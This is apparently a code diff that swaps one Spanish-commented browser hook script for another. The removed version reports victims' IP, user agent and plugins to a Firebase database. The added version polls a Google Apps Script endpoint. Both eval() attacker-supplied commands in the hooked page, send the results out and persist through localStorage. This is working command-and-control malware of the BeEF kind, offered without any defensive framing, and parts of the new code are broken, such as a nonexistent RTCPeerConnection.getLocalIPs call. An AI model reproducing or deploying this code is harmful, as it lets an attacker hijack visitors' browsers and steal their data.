@@ -1,100 +1,73 @@
-// Configuración Firebase (usa tu URL)
-const FIREBASE_CONFIG = {
-  databaseURL: "https://bdbeef-fb420-default-rtdb.firebaseio.com"
-};
-
-// Inicialización
-const hookId = 'hook_' + Math.random().toString(36).substr(2, 9);
-let isActive = true;
-
-// Función principal
-(async function() {
-  // Persistencia en localStorage
-  if (!localStorage.getItem('beef_hook')) {
-    localStorage.setItem('beef_hook', hookId);
-  } else {
-    hookId = localStorage.getItem('beef_hook');
+// hook.js
+(function() {
+  var SCRIPT_URL = "URL_DE_TU_GOOGLE_APPS_SCRIPT";
+  var SESSION_ID = Math.random().toString(36).substring(2) + 
+                   Math.random().toString(36).substring(2);
+  var CHECK_INTERVAL = 5000; // 5 segundos
+  
+  // Inicializar sesión
+  function initSession() {
+    var xhr = new XMLHttpRequest();
+    var url = SCRIPT_URL + "?action=init&sessionId=" + SESSION_ID + 
+              "&ua=" + encodeURIComponent(navigator.userAgent) +
+              "&ip=" + encodeURIComponent(JSON.stringify(getIPs()));
+    
+    xhr.open("GET", url, true);
+    xhr.send();
   }
-
-  // Registrar hook
-  await registerHook();
-
-  // Heartbeat cada 25 segundos
-  setInterval(sendHeartbeat, 25000);
-
-  // Escuchar comandos
-  listenCommands();
-})();
-
-// Funciones auxiliares
-async function registerHook() {
-  const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => data.ip);
   
-  const hookData = {
-    id: hookId,
-    ip: ip,
-    userAgent: navigator.userAgent,
-    url: window.location.href,
-    plugins: Array.from(navigator.plugins).map(p => p.name),
-    firstSeen: new Date().toISOString(),
-    lastActive: new Date().toISOString(),
-    status: "active"
-  };
-
-  // Enviar a Firebase
-  fetch(`${FIREBASE_CONFIG.databaseURL}/beef_hooks/${hookId}.json`, {
-    method: 'PUT',
-    body: JSON.stringify(hookData)
-  });
-}
-
-function sendHeartbeat() {
-  if (!isActive) return;
+  // Obtener direcciones IP (aproximación)
+  function getIPs() {
+    return new Promise(function(resolve) {
+      RTCPeerConnection.getLocalIPs(function(ips) {
+        resolve(ips);
+      });
+    });
+  }
   
-  const update = { 
-    lastActive: new Date().toISOString(),
-    status: "active"
-  };
-  
-  fetch(`${FIREBASE_CONFIG.databaseURL}/beef_hooks/${hookId}.json`, {
-    method: 'PATCH',
-    body: JSON.stringify(update)
-  });
-}
-
-function listenCommands() {
-  const eventSource = new EventSource(`${FIREBASE_CONFIG.databaseURL}/beef_commands.json?orderBy="hookId"&equalTo="${hookId}"`);
-
-  eventSource.onmessage = (e) => {
-    const data = JSON.parse(e.data);
-    if (data && data.instruction) {
-      try {
-        eval(data.instruction);
-        logCommand(data, "executed");
-      } catch (err) {
-        logCommand(data, "failed", err.message);
+  // Comprobar comandos
+  function checkCommands() {
+    var xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState == 4 && xhr.status == 200) {
+        var cmd = xhr.responseText;
+        if (cmd && cmd !== "noop") {
+          executeCommand(cmd);
+        }
       }
-    }
-  };
-}
-
-function logCommand(cmd, status, error = null) {
-  const logData = {
-    ...cmd,
-    status: status,
-    executedAt: new Date().toISOString(),
-    error: error
-  };
+    };
+    
+    xhr.open("GET", SCRIPT_URL + "?action=getcmd&sessionId=" + SESSION_ID, true);
+    xhr.send();
+  }
   
-  fetch(`${FIREBASE_CONFIG.databaseURL}/command_logs.json`, {
-    method: 'POST',
-    body: JSON.stringify(logData)
-  });
-}
-
-// Autodestrucción después de fecha límite
-const EXPIRATION_DATE = new Date('2024-12-31');
-if (new Date() > EXPIRATION_DATE) {
-  isActive = false;
-  localStorage.removeItem('beef_hook');
-}
+  // Ejecutar comando y enviar respuesta
+  function executeCommand(cmd) {
+    try {
+      var result = eval(cmd);
+      sendResponse(cmd, result);
+    } catch(e) {
+      sendResponse(cmd, "ERROR: " + e.message);
+    }
+  }
+  
+  function sendResponse(cmd, response) {
+    var xhr = new XMLHttpRequest();
+    var url = SCRIPT_URL + "?action=response&sessionId=" + SESSION_ID + 
+              "&cmdId=" + encodeURIComponent(cmd) +
+              "&response=" + encodeURIComponent(response);
+    
+    xhr.open("GET", url, true);
+    xhr.send();
+  }
+  
+  // Persistencia con localStorage
+  if (!localStorage.getItem('_persist')) {
+    localStorage.setItem('_persist', 'true');
+    setInterval(checkCommands, CHECK_INTERVAL);
+    initSession();
+  }
+  
+  // Iniciar chequeo de comandos
+  setInterval(checkCommands, CHECK_INTERVAL);
+})();
